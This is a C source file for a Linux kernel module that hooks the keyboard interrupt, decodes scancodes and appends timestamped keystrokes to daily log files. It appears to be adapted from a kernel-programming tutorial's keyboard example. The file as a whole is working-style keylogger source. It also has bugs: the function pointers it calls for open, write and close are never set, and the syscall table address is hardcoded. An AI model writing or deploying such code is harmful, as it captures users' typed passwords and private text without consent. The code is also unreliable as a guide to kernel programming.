
#include <linux/kernel.h> /* We're doing kernel work */
#include <linux/module.h> /* Specifically, a module */
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h> /* We want an interrupt */
#include <asm/io.h>
#include<linux/slab.h>
#include <linux/syscalls.h>


#define MY_WORK_QUEUE_NAME "WQsched.c"
char *scancode_ref=NULL;
static struct workqueue_struct *my_workqueue;
typedef struct {
  	struct work_struct my_work;
  	char  *x;
} my_work_t;

my_work_t *work;

char USER_NAME[7]="USRNAM\0";
char USER_TIME[11]="###:##:###";
char log_filename[11]="##_##_####";
unsigned long *syscall_table = (unsigned long *) 0xffffffff81600340;


void print_time(char char_time[]);
void write_file(char *,char *);

asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
asmlinkage int (*original_close)(unsigned int);
asmlinkage int (*original_open)(const char __user *, int, int);

int flag=0,index;
unsigned char arr[80]=
{
  0, 0, '1', '2', '3', '4', '5', '6', '7', '8',  '9', '0', '-', '=', '\b',	/* Backspace */
  '\t',			/* Tab */
  'q', 'w', 'e', 'r','t', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',	/* 28 Enter key */
    0,			
  'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`',   
   0, /* 42 left shift */		
 '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/',   
   0, /* 54 right shift */				
  '*',
    0,	
  ' ',	/* Space bar */
    0, 0,0,   0,   0,   0,   0,   0,   0,   0,  0, 0, 0, 0, 0,  0, '-',
    0, 0,  0, '+'
};

     /*
 * This will get called by the kernel as soon as it's safe
 * to do everything normally allowed by kernel modules.
 */
 static void got_char(struct work_struct *my_work)
 {

	char fileinfo_buff[200],key[10], path[120];
	

	char scancode = scancode_ref ? *scancode_ref : 0;
	index=(int)scancode;
	
	 printk(KERN_INFO "Scan Code %x %d %s.\n",
	 scancode & 0x7F,index,
	 scancode & 0x80 ? "Released" : "Pressed");

	strcpy(path,"/home/hetalsavaliya/lkm/");
	strcat(path,log_filename);
	
		  print_time(USER_TIME);    // Get Current Time
		  strcpy(fileinfo_buff,USER_TIME+1);    // Store Time in Log Array
		 
		sprintf(key,"%c",arr[index]);
		strcat(fileinfo_buff,key);
	
		
		

		write_file(fileinfo_buff,path);
			

 }
void write_file(char *buffer,char *path)
{
	 mm_segment_t old_fs;
	int fd;
	   
	 old_fs=get_fs();
         set_fs(KERNEL_DS);   
         fd = original_open(path, O_WRONLY|O_CREAT|O_APPEND,0777);
      //   printk(" %d %s",fd,buffer); 
         if(fd >= 0)     
       		{
                       	original_write(fd,buffer,strlen(buffer));  
                        original_close(fd);                  
                }
	else
		{printk(KERN_ALERT "\n Errro in write_file() while opening a file");}
	set_fs(old_fs);
	return;
}

     /*
 * This function services keyboard interrupts. It reads the relevant
 * information from the keyboard and then puts the non time critical
 * part into the work queue. This will be run when the kernel considers it safe.
 */
 irqreturn_t irq_handler(int irq, void *dev_id, struct pt_regs *regs)
 {
	 /*
	 * This variables are static because they need to be
	 * accessible (through pointers) to the bottom half routine.
	 */
	 static int initialised = 0;
	 static unsigned char scancode;
	 //static struct work_struct task;
	 unsigned char status;
     
	     /*
	 * Read keyboard status
	 */
	 status = inb(0x64);
	 scancode = inb(0x60);
	/**** my code */
	   work = (my_work_t *)kmalloc(sizeof(my_work_t), GFP_KERNEL);
	    if (work) {

	      	INIT_WORK( (struct work_struct *)work, got_char );

	      work->x = &scancode;
		scancode_ref=&scancode;
	       queue_work( my_workqueue, (struct work_struct *)work );

	    }

     	return IRQ_HANDLED;
 }

     /*
 * Initialize the module - register the IRQ handler
 */
 int init_module()
 {
	 my_workqueue = create_workqueue(MY_WORK_QUEUE_NAME);
     
	     /*
	 * Since the keyboard handler won't co-exist with another handler,
	 * such as us, we have to disable it (free its IRQ) before we do
	 * anything. Since we don't know where it is, there's no way to
	 * reinstate it later - so the computer will have to be rebooted
	 * when we're done.
	 */
	 free_irq(1, NULL);
     
	     /*
	 * Request IRQ 1, the keyboard IRQ, to go to our irq_handler.
	 * SA_SHIRQ means we're willing to have othe handlers on this IRQ.
	 * SA_INTERRUPT can be used to make the handler into a fast interrupt.
	 */
	 return request_irq(1, /* The number of the keyboard IRQ on PCs */
	 irq_handler, /* our handler */
	 IRQF_SHARED, "test_keyboard_irq_handler",
	 (void *)(irq_handler));
 }
void print_time(char char_time[])
{
 struct timeval my_tv;
 int sec, hr, min, tmp1, tmp2;
 int days,years,days_past_currentyear;
 int i=0,month=0,date=0;
 unsigned long get_time;
 char_time[11]="#00:00:00#";

	
	do_gettimeofday(&my_tv);                    // Get System Time From Kernel Mode
	get_time = my_tv.tv_sec;                   // Fetch System time in Seconds
//	printk(KERN_ALERT "\n %ld",get_time);
	get_time = get_time + 43200;
	sec = get_time % 60;                       // Convert into Seconds
	tmp1 = get_time / 60;
	min = tmp1 % 60;                          // Convert into Minutes
	tmp2 = tmp1 / 60;
	hr = (tmp2+4) % 24;                      // Convert into Hours
        hr=hr+1;
	char_time[1]=(hr/10)+48;                // Convert into Char from Int
	char_time[2]=(hr%10)+48;
	char_time[4]=(min/10)+48;
	char_time[5]=(min%10)+48;
	char_time[7]=(sec/10)+48;
	char_time[8]=(sec%10)+48;
	char_time[10]='\0';
	/* calculating date from time in seconds */
	days = (tmp2+4)/24;
	days_past_currentyear = days % 365;
	years = days / 365;
	for(i=1970;i<=(1970+years);i++)
	{
		if ((i % 4) == 0)
	 		days_past_currentyear--;
	}

	if((1970+years % 4) != 0)
	{
		if(days_past_currentyear >=1 && days_past_currentyear <=31)
		{
			month=1; //JAN
			date = days_past_currentyear;

		}
		else if (days_past_currentyear >31 && days_past_currentyear <= 59)
		{
			month = 2;
			date = days_past_currentyear - 31;
		}

		else if (days_past_currentyear >59 && days_past_currentyear <= 90)
		{
        		month = 3;
        		date = days_past_currentyear - 59;
		}
		else if (days_past_currentyear >90 && days_past_currentyear <= 120)
		{
        		month = 4;
        		date = days_past_currentyear - 90;
		}
		else if (days_past_currentyear >120 && days_past_currentyear <= 151)
		{
        		month = 5;
		        date = days_past_currentyear - 120;
		}	
		else if (days_past_currentyear >151 && days_past_currentyear <= 181)
		{
        		month = 6;
		        date = days_past_currentyear - 151;
		}
		else if (days_past_currentyear >181 && days_past_currentyear <= 212)
		{
        		month = 7;
        		date = days_past_currentyear - 181;
		}
		else if (days_past_currentyear >212 && days_past_currentyear <= 243)
		{
        		month = 8;
        		date = days_past_currentyear - 212;
		}
		else if (days_past_currentyear >243 && days_past_currentyear <= 273)
		{
        		month = 9;
        		date = days_past_currentyear - 243;
		}
		else if (days_past_currentyear >273 && days_past_currentyear <= 304)
		{
        		month = 10;
        		date = days_past_currentyear - 273;
		}

		else if (days_past_currentyear >304 && days_past_currentyear <= 334)
		{
        		month = 11;
       			date = days_past_currentyear - 304;
		}
		else if (days_past_currentyear >334 && days_past_currentyear <= 365)
		{
        		month = 12;
        		date = days_past_currentyear - 334;
		}
		
	//	printk(KERN_ALERT "month=%d date=%d year=%d",month,date,(1970+years));
		
	}
	// for leap years..
	else
	{
		if(days_past_currentyear >=1 && days_past_currentyear <=31)
		{
        		month=1; //JAN
        		date = days_past_currentyear;

		}
		else if (days_past_currentyear >31 && days_past_currentyear <= 60)
		{
       			month = 2;
        		date = days_past_currentyear - 31;
		}

		else if (days_past_currentyear >60 && days_past_currentyear <= 91)
		{
        		month = 3;
        		date = days_past_currentyear - 60;
		}
		else if (days_past_currentyear >91 && days_past_currentyear <= 121)
		{
        		month = 4;
        		date = days_past_currentyear - 91;
		}
		else if (days_past_currentyear >121 && days_past_currentyear <= 152)
		{
        		month = 5;
        		date = days_past_currentyear - 121;
		}
		else if (days_past_currentyear >152 && days_past_currentyear <= 182)
		{
        		month = 6;
        		date = days_past_currentyear - 152;
		}
		else if (days_past_currentyear >182 && days_past_currentyear <= 213)
		{
        		month = 7;
        		date = days_past_currentyear - 182;
		}
		else if (days_past_currentyear >213 && days_past_currentyear <= 244)
		{
        		month = 8;
        		date = days_past_currentyear - 213;
		}
		else if (days_past_currentyear >244 && days_past_currentyear <= 274)
		{
        		month = 9;
        		date = days_past_currentyear - 244;
		}
		else if (days_past_currentyear >274 && days_past_currentyear <= 305)
		{
        		month = 10;
        		date = days_past_currentyear - 274;
		}

		else if (days_past_currentyear >305 && days_past_currentyear <= 335)
		{
        		month = 11;
        		date = days_past_currentyear - 305;
		}
		else if (days_past_currentyear >335 && days_past_currentyear <= 366)
		{
        		month = 12;
        		date = days_past_currentyear - 335;
		}

		//	printk(KERN_ALERT "\nmonth=%d date=%d year=%d",month,date,(1970+years));


	}
	 log_filename[0]=(month/10)+48;                // Convert into Char from Int
                log_filename[1]=(month%10)+48;
                log_filename[3]=(date/10)+48;
                log_filename[4]=(date%10)+48;
                tmp1 = ((1970+years) % 10) + 48;
                log_filename[9]= tmp1;
                tmp1 = (1970+years)/ 10;
                tmp2 = tmp1 % 10;
                log_filename[8]= tmp2 + 48;
                tmp1 = tmp1 / 10;
                tmp2 = tmp1 % 10;
                log_filename[7]=tmp2 + 48;
                tmp1 = tmp1 / 10;
                log_filename[6]= tmp1+48;
                log_filename[10]='\0';
    
}

     /*
 * Cleanup
 */
 void cleanup_module()
 {
	 /*
	 * This is only here for completeness. It's totally irrelevant, since
	 * we don't have a way to restore the normal keyboard interrupt so the
	 * computer is completely useless and has to be rebooted.
	 */
	 free_irq(1, NULL);
 }

     /*
 * some work_queue related functions are just available to GPL licensed Modules
 */
 MODULE_LICENSE("GPL");
